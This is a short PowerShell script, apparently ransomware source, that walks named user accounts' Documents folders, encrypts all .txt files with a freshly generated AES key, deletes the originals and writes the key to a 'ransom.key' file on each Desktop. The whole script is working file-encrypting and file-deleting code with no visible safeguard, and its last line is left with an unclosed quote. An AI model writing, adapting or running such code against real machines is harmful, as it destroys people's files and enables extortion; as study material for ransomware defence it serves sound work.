$users = "IY3S601", "Customer Support" | ForEach-Object {
# Try to find a better method of getting usernames
    $currentuser = $_
    $directorypath = "C:\Users\$_\Documents" 
    $logfile = 'logfile.txt'
    $bytesfile = 'bytesfile.txt'
    $fileinfo = 'fileinfo.txt'
    $files = get-childitem "C:\Users\$_\Documents" -recurse
    $RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider 
    $key = New-Object Byte[] 32
    $RNGCrypto.GetBytes($key)
    $iv = New-Object Byte[] 16
    $RNGCrypto.GetBytes($iv)
    $AES = New-Object System.Security.Cryptography.AesManaged
    $AES.Key = $key
    $AES.iv = $iv
    echo "AES key: $key `n IV: $iv" > $logfile
    Write-Host "Starting Encryption on User: $currentuser"
    Get-ChildItem $directorypath -recurse -Filter *.txt | 
    Foreach-Object {
        $fullname = $_.FullName
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $Encryptor = $AES.CreateEncryptor()
        $bytes = gc $_.FullName -Encoding byte
        $encryptedData = $Encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
        [byte[]] $fullData = $AES.IV + $encryptedData
        sc -Value $fullData -Path "$fullname.enc" -Encoding byte
        Write-Host "Encrypting file: $fullname > $fullname.enc"
        $bytes = $Null
        rm $fullname
    }
    sc -Value $key -LiteralPath "C:\Users\$_\Desktop\ransom.key" -Encoding byte
}
Read-Host -Prompt "Press Enter to exit
